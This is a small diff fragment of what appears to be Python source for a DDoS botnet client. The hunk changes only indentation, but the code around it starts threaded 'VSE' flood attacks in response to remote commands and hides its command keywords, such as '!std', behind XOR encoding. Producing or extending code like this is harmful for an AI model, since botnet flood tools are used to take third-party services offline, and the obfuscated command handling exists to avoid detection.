@@ -302,7 +302,7 @@ def handle(sock):
 						p = threading.Thread(target=VSE, args =(command[1],command[2]))
 						p.start()
 					attack+=1
-			        elif command[0] == xor_dec('QAAQAg==',key):#encoded keyword: !std
+				elif command[0] == xor_dec('QAAQAg==',key):#encoded keyword: !std
 					if attack != 0:
 						stop = True
 						attack=0
